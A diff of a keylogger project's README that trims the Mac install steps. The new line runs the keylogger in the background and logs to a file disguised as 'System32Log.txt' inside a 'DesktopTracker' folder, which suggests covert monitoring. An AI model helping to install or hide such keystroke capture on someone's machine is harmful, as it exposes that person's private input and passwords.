@@ -21,28 +21,14 @@ Currently, there are three keylogger programs for the major operating systems; W
 Double click on Keylogger.exe file in windows folder
 
 ## Mac
-This is a little more complicated. Please note, it does not work for secure areas such as password inputs. I have not found a work around yet.
-
-### Installation
-Download the repo. It will install in `/usr/local/bin/keylogger`.
-
-Install it:
-
-`$ git clone https://github.com/GiacomoLaw/Keylogger && cd keylogger/mac`
+Go to mac folder. 
 
 `$ make && make install`
 
-It will log to `/var/log/keystroke.log`. This may require root access, but you can change that if you want. Set where you want it to log:
 
-`$ keylogger ~/logfile.txt`
 
-`Logging to: /var/log/keystroke.log`
+`$ keylogger Path to DesktopTracker folder in you maachine/logs/System32Log.txt &`
 
-Want to make it start on system startup?
-
-`$ sudo make startup`
-
-That will run it on startup.
 
 ### Uninstall
 `$ sudo make uninstall`
